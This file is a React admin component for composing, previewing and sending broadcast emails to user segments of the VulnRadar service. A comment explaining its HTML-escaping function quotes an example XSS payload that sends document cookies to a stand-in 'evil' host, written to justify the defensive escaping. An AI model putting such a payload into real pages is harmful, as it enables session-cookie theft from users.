"use client";

import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import {
  Mail,
  Send,
  Eye,
  Trash2,
  RefreshCw,
  Loader2,
  FileEdit,
  CheckCircle2,
  Clock,
  Users,
  MailOpen,
} from "lucide-react";
import { cn } from "@/lib/ui/utils";
import { SaveConfirmationModal } from "@/components/shared/save-confirmation-modal";

/**
 * HTML-escape a string for safe interpolation into the broadcast email
 * template. Without this, a moderator could compose a `title` or
 * `content` containing `</h2><script>fetch('https://evil/?c='+document.cookie)</script>`
 * and the resulting email would run arbitrary JS in vulnradar.dev's
 * authenticated origin on any client that opens the preview pane or
 * forwards the message.
 */
function escapeHtml(input: string): string {
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

interface Broadcast {
  id: string;
  title: string;
  status: string;
  created_at: string;
  sent_at?: string;
  created_by_name?: string;
  sent_by_name?: string;
}

const EMAIL_COLORS = {
  BG_DARK: "#0a0e13",
  BG_CARD: "#0f172a",
  BORDER: "#1e293b",
  TEXT_PRIMARY: "#f8fafc",
  TEXT_SECONDARY: "#94a3b8",
  TEXT_MUTED: "#64748b",
  TEXT_DARK: "#475569",
  ACCENT_BLUE: "#2563eb",
  ACCENT_BLUE_LIGHT: "#3b82f6",
};

function generatePreviewHtml(title: string, content: string): string {
  const safeTitle = escapeHtml(title || "Subject");
  const safeContent = escapeHtml(
    content || "<p>Email content will appear here...</p>",
  );
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <style>body { margin: 0; }</style>
</head>
<body style="margin: 0; padding: 0; background-color: ${EMAIL_COLORS.BG_DARK}; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; color: #e5e7eb;">
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color: ${EMAIL_COLORS.BG_DARK}; padding: 40px 20px;">
    <tr>
      <td align="center">
        <table role="presentation" width="600" cellpadding="0" cellspacing="0" border="0" style="max-width: 600px; width: 100%;">
          <tr>
            <td style="padding: 0 0 20px 0; text-align: center;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
                <tr>
                  <td align="center" style="padding-bottom: 12px;">
                    <img src="/favicon.svg" alt="VulnRadar" width="48" height="48" style="display: block; margin: 0 auto;" />
                  </td>
                </tr>
                <tr>
                  <td align="center">
                    <h1 style="margin: 0; font-size: 24px; font-weight: 700; color: ${EMAIL_COLORS.TEXT_PRIMARY}; letter-spacing: -0.3px;">VulnRadar</h1>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding: 0 0 24px 0;">
              <div style="height: 2px; background: linear-gradient(90deg, ${EMAIL_COLORS.ACCENT_BLUE}, ${EMAIL_COLORS.ACCENT_BLUE_LIGHT}); border-radius: 999px;"></div>
            </td>
          </tr>
          <tr>
            <td style="background-color: ${EMAIL_COLORS.BG_CARD}; border: 1px solid ${EMAIL_COLORS.BORDER}; border-radius: 12px; padding: 32px 28px;">
              <h2 style="margin: 0 0 16px 0; font-size: 20px; font-weight: 600; color: ${EMAIL_COLORS.TEXT_PRIMARY};">${safeTitle}</h2>
              <div style="font-size: 14px; color: ${EMAIL_COLORS.TEXT_SECONDARY}; line-height: 1.6;">${safeContent}</div>
            </td>
          </tr>
          <tr>
            <td style="padding: 28px 20px 0 20px;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
                <tr>
                  <td style="text-align: center;">
                    <p style="margin: 0 0 8px 0; font-size: 12px; color: ${EMAIL_COLORS.TEXT_MUTED}; line-height: 1.6;">
                      <a href="https://vulnradar.dev" style="color: ${EMAIL_COLORS.ACCENT_BLUE_LIGHT}; text-decoration: none;">vulnradar.dev</a>
                    </p>
                    <p style="margin: 0; font-size: 11px; color: ${EMAIL_COLORS.TEXT_DARK}; line-height: 1.5;">
                      VulnRadar - Web Vulnerability Scanner<br />
                      This is an automated message. Please do not reply directly.
                    </p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}

const SEGMENT_LABELS: Record<string, string> = {
  all: "All Users",
  premium: "All Premium Users",
  free: "Free Users",
  core_supporter: "Core Supporter",
  pro_supporter: "Pro Supporter",
  elite_supporter: "Elite Supporter",
  specific: "Specific Email",
};

export function MassEmailManager() {
  const [messages, setMessages] = useState<Broadcast[]>([]);
  const [loading, setLoading] = useState(false);
  const [sending, setSending] = useState<string | null>(null);
  const [deleting, setDeleting] = useState<string | null>(null);
  const [pendingDelete, setPendingDelete] = useState<Broadcast | null>(null);
  const [title, setTitle] = useState("");
  const [content, setContent] = useState("");
  const [segment, setSegment] = useState("all");
  const [specificEmail, setSpecificEmail] = useState("");
  const [previewOpen, setPreviewOpen] = useState(false);

  useEffect(() => {
    fetchMessages();
  }, []);

  async function fetchMessages() {
    setLoading(true);
    try {
      const res = await fetch("/api/v3/admin/features", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "list", section: "broadcast" }),
      });
      const data = await res.json();
      setMessages(data.messages || []);
    } catch (err) {
      console.error("Error fetching messages:", err);
    } finally {
      setLoading(false);
    }
  }

  async function handleCreate() {
    if (!title || !content) return;
    if (segment === "specific" && !specificEmail) return;
    setLoading(true);
    try {
      const segmentFilter =
        segment === "specific"
          ? { segment: `email:${specificEmail}` }
          : { segment };

      const res = await fetch("/api/v3/admin/features", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "create",
          section: "broadcast",
          title,
          content,
          message_type: "email",
          segment_filter: segmentFilter,
        }),
      });
      if (res.ok) {
        setTitle("");
        setContent("");
        setSegment("all");
        setSpecificEmail("");
        fetchMessages();
      }
    } catch (err) {
      console.error("Error creating message:", err);
    } finally {
      setLoading(false);
    }
  }

  async function handleSend(id: string) {
    setSending(id);
    try {
      await fetch("/api/v3/admin/features", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "send", section: "broadcast", id }),
      });
      fetchMessages();
    } catch (err) {
      console.error("Error sending:", err);
    } finally {
      setSending(null);
    }
  }

  async function handleResend(id: string) {
    setSending(id);
    try {
      await fetch("/api/v3/admin/features", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "resend", section: "broadcast", id }),
      });
      fetchMessages();
    } catch (err) {
      console.error("Error resending:", err);
    } finally {
      setSending(null);
    }
  }

  async function handleDelete() {
    if (!pendingDelete) return;
    setDeleting(pendingDelete.id);
    try {
      await fetch("/api/v3/admin/features", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "delete",
          section: "broadcast",
          id: pendingDelete.id,
        }),
      });
      fetchMessages();
      setPendingDelete(null);
    } catch (err) {
      console.error("Error deleting:", err);
    } finally {
      setDeleting(null);
    }
  }

  const drafts = messages.filter((m) => m.status === "draft");
  const sent = messages.filter((m) => m.status === "sent");
  const isFormValid =
    title && content && (segment !== "specific" || specificEmail);

  return (
    <div className="space-y-4">
      {/* Stats */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
        <div className="flex items-center gap-3 p-4 rounded-xl border border-border/40 bg-card/30 hover:bg-card/50 hover:border-border/60 transition-colors">
          <div className="p-2 rounded-lg bg-primary/10">
            <MailOpen className="h-4 w-4 text-primary" />
          </div>
          <div>
            <p className="text-2xl font-bold text-foreground">
              {messages.length}
            </p>
            <p className="text-xs text-muted-foreground">Total Broadcasts</p>
          </div>
        </div>
        <div className="flex items-center gap-3 p-4 rounded-xl border border-border/40 bg-card/30 hover:bg-card/50 hover:border-border/60 transition-colors">
          <div className="p-2 rounded-lg bg-amber-500/10">
            <FileEdit className="h-4 w-4 text-amber-500" />
          </div>
          <div>
            <p className="text-2xl font-bold text-foreground">
              {drafts.length}
            </p>
            <p className="text-xs text-muted-foreground">Drafts</p>
          </div>
        </div>
        <div className="flex items-center gap-3 p-4 rounded-xl border border-border/40 bg-card/30 hover:bg-card/50 hover:border-border/60 transition-colors">
          <div className="p-2 rounded-lg bg-emerald-500/10">
            <CheckCircle2 className="h-4 w-4 text-emerald-500" />
          </div>
          <div>
            <p className="text-2xl font-bold text-foreground">{sent.length}</p>
            <p className="text-xs text-muted-foreground">Sent</p>
          </div>
        </div>
        <div className="flex items-center gap-3 p-4 rounded-xl border border-border/40 bg-card/30 hover:bg-card/50 hover:border-border/60 transition-colors">
          <div className="p-2 rounded-lg bg-blue-500/10">
            <Users className="h-4 w-4 text-blue-500" />
          </div>
          <div>
            <p className="text-2xl font-bold text-foreground">
              {new Set(messages.map((m) => m.created_by_name)).size}
            </p>
            <p className="text-xs text-muted-foreground">Contributors</p>
          </div>
        </div>
      </div>

      {/* Compose card */}
      <Card className="border-border/50 bg-card/50 overflow-hidden">
        <div className="flex items-center justify-between px-4 sm:px-5 py-4 border-b border-border/50">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-primary/10">
              <Mail className="h-4 w-4 text-primary" />
            </div>
            <div>
              <h3 className="text-sm font-semibold text-foreground">
                Compose Broadcast
              </h3>
              <p className="text-xs text-muted-foreground mt-0.5">
                Write and send emails to user segments
              </p>
            </div>
          </div>
        </div>
        <CardContent className="p-4 sm:p-5 space-y-4">
          <div>
            <label className="text-xs font-semibold text-muted-foreground uppercase tracking-wide mb-2 block">
              Subject
            </label>
            <Input
              placeholder="e.g., Important update from VulnRadar"
              value={title}
              onChange={(e) => setTitle(e.target.value)}
              className="h-10 bg-background/50 border-border/40 focus:border-primary/50"
            />
          </div>

          <div>
            <label className="text-xs font-semibold text-muted-foreground uppercase tracking-wide mb-2 block">
              Content (HTML supported)
            </label>
            <Textarea
              placeholder="Write your email content here... HTML tags are supported."
              value={content}
              onChange={(e) => setContent(e.target.value)}
              className="min-h-36 bg-background/50 border-border/40 focus:border-primary/50 resize-none"
            />
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div>
              <label className="text-xs font-semibold text-muted-foreground uppercase tracking-wide mb-2 block">
                Recipients
              </label>
              <select
                value={segment}
                onChange={(e) => setSegment(e.target.value)}
                className="w-full h-10 rounded-lg border border-border/40 bg-background/50 px-3 py-2 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/20"
              >
                {Object.entries(SEGMENT_LABELS).map(([value, label]) => (
                  <option key={value} value={value}>
                    {label}
                  </option>
                ))}
              </select>
            </div>
            {segment === "specific" && (
              <div>
                <label className="text-xs font-semibold text-muted-foreground uppercase tracking-wide mb-2 block">
                  Email Address
                </label>
                <Input
                  type="email"
                  placeholder="user@example.com"
                  value={specificEmail}
                  onChange={(e) => setSpecificEmail(e.target.value)}
                  className="h-10 bg-background/50 border-border/40 focus:border-primary/50"
                />
              </div>
            )}
          </div>

          <div className="flex gap-3 pt-1">
            <Dialog open={previewOpen} onOpenChange={setPreviewOpen}>
              <DialogTrigger asChild>
                <Button
                  variant="outline"
                  className="gap-2 border-border/40"
                  disabled={!title && !content}
                >
                  <Eye className="h-4 w-4" />
                  Preview
                </Button>
              </DialogTrigger>
              <DialogContent className="max-w-5xl max-h-[90vh] overflow-auto">
                <DialogHeader className="pb-4">
                  <DialogTitle>Email Preview</DialogTitle>
                </DialogHeader>
                <iframe
                  srcDoc={generatePreviewHtml(title, content)}
                  className="w-full h-[700px] border border-border/50 rounded-lg"
                  title="Email Preview"
                />
              </DialogContent>
            </Dialog>

            <Button
              onClick={handleCreate}
              disabled={loading || !isFormValid}
              className="gap-2"
            >
              {loading ? (
                <Loader2 className="h-4 w-4 animate-spin" />
              ) : (
                <FileEdit className="h-4 w-4" />
              )}
              Save as Draft
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Broadcasts list card */}
      <Card className="border-border/50 bg-card/50 overflow-hidden">
        <div className="flex items-center justify-between px-4 sm:px-5 py-4 border-b border-border/50">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-primary/10">
              <Send className="h-4 w-4 text-primary" />
            </div>
            <div>
              <h3 className="text-sm font-semibold text-foreground">
                Broadcasts
              </h3>
              <p className="text-xs text-muted-foreground mt-0.5">
                {messages.length} total &mdash; {drafts.length} draft
                {drafts.length !== 1 ? "s" : ""}, {sent.length} sent
              </p>
            </div>
          </div>
          <Button
            variant="outline"
            size="sm"
            className="gap-2 border-border/40 shrink-0"
            onClick={fetchMessages}
            disabled={loading}
          >
            <RefreshCw className={cn("h-4 w-4", loading && "animate-spin")} />
            <span className="hidden sm:inline">Refresh</span>
          </Button>
        </div>

        {loading && messages.length === 0 ? (
          <div className="flex items-center justify-center py-16">
            <Loader2 className="h-5 w-5 animate-spin text-muted-foreground" />
          </div>
        ) : messages.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-16 text-center px-4">
            <div className="p-4 rounded-full bg-muted/50 mb-4">
              <MailOpen className="h-8 w-8 text-muted-foreground/50" />
            </div>
            <p className="text-sm font-medium text-foreground">
              No broadcasts yet
            </p>
            <p className="text-xs text-muted-foreground mt-1">
              Compose your first broadcast email above
            </p>
          </div>
        ) : (
          <div className="divide-y divide-border/40">
            {messages.map((msg) => {
              const isDraft = msg.status === "draft";
              const isSending = sending === msg.id;
              const isDeleting = deleting === msg.id;
              return (
                <div
                  key={msg.id}
                  className="group flex items-start gap-4 px-4 sm:px-5 py-4 hover:bg-muted/20 transition-colors"
                >
                  {/* Icon */}
                  <div
                    className={cn(
                      "p-2 rounded-lg shrink-0 mt-0.5",
                      isDraft ? "bg-amber-500/10" : "bg-emerald-500/10",
                    )}
                  >
                    {isDraft ? (
                      <FileEdit className="h-4 w-4 text-amber-500" />
                    ) : (
                      <CheckCircle2 className="h-4 w-4 text-emerald-500" />
                    )}
                  </div>

                  {/* Content */}
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap">
                      <p className="text-sm font-medium text-foreground truncate">
                        {msg.title}
                      </p>
                      <Badge
                        variant="outline"
                        className={cn(
                          "text-[10px] px-2 py-0.5 font-medium capitalize shrink-0",
                          isDraft
                            ? "bg-amber-500/10 text-amber-500 border-amber-500/20"
                            : "bg-emerald-500/10 text-emerald-500 border-emerald-500/20",
                        )}
                      >
                        {msg.status}
                      </Badge>
                    </div>
                    <div className="flex items-center gap-3 mt-1 flex-wrap">
                      <span className="text-xs text-muted-foreground flex items-center gap-1">
                        <Clock className="h-3 w-3" />
                        {new Date(msg.created_at).toLocaleDateString("en-US", {
                          month: "short",
                          day: "numeric",
                          year: "numeric",
                        })}
                      </span>
                      {msg.created_by_name && (
                        <span className="text-xs text-muted-foreground">
                          by{" "}
                          <span className="text-foreground font-medium">
                            {msg.created_by_name}
                          </span>
                        </span>
                      )}
                      {!isDraft && msg.sent_at && (
                        <span className="text-xs text-muted-foreground flex items-center gap-1">
                          <Send className="h-3 w-3" />
                          Sent{" "}
                          {new Date(msg.sent_at).toLocaleString("en-US", {
                            month: "short",
                            day: "numeric",
                            hour: "2-digit",
                            minute: "2-digit",
                          })}
                          {msg.sent_by_name && (
                            <span>
                              by{" "}
                              <span className="text-foreground font-medium">
                                {msg.sent_by_name}
                              </span>
                            </span>
                          )}
                        </span>
                      )}
                    </div>
                  </div>

                  {/* Actions */}
                  <div className="flex items-center gap-2 shrink-0 opacity-0 group-hover:opacity-100 transition-opacity">
                    {isDraft ? (
                      <>
                        <Button
                          size="sm"
                          className="h-8 gap-1.5 text-xs"
                          onClick={() => handleSend(msg.id)}
                          disabled={isSending || isDeleting}
                        >
                          {isSending ? (
                            <Loader2 className="h-3.5 w-3.5 animate-spin" />
                          ) : (
                            <Send className="h-3.5 w-3.5" />
                          )}
                          Send
                        </Button>
                        <Button
                          size="sm"
                          variant="outline"
                          className="h-8 w-8 p-0 border-border/40 text-destructive hover:text-destructive hover:bg-destructive/10"
                          onClick={() => setPendingDelete(msg)}
                          disabled={isSending || isDeleting}
                          title="Delete draft"
                        >
                          {isDeleting ? (
                            <Loader2 className="h-3.5 w-3.5 animate-spin" />
                          ) : (
                            <Trash2 className="h-3.5 w-3.5" />
                          )}
                        </Button>
                      </>
                    ) : (
                      <Button
                        size="sm"
                        variant="outline"
                        className="h-8 gap-1.5 text-xs border-border/40"
                        onClick={() => handleResend(msg.id)}
                        disabled={isSending}
                      >
                        {isSending ? (
                          <Loader2 className="h-3.5 w-3.5 animate-spin" />
                        ) : (
                          <RefreshCw className="h-3.5 w-3.5" />
                        )}
                        Resend
                      </Button>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </Card>

      {/* Delete Confirmation Modal */}
      <SaveConfirmationModal
        isOpen={!!pendingDelete}
        onClose={() => setPendingDelete(null)}
        onConfirm={handleDelete}
        title="Delete Broadcast"
        description="This will permanently delete this broadcast draft. This action cannot be undone."
        changes={
          pendingDelete
            ? [
                {
                  field: "title",
                  label: "Subject",
                  oldValue: pendingDelete.title,
                  newValue: "Deleted",
                },
                {
                  field: "status",
                  label: "Status",
                  oldValue: pendingDelete.status,
                  newValue: "—",
                },
                {
                  field: "created_at",
                  label: "Created",
                  oldValue: new Date(
                    pendingDelete.created_at,
                  ).toLocaleDateString(),
                  newValue: "—",
                },
              ]
            : []
        }
        loading={deleting === pendingDelete?.id}
        confirmText="Delete"
        variant="destructive"
      />
    </div>
  );
}
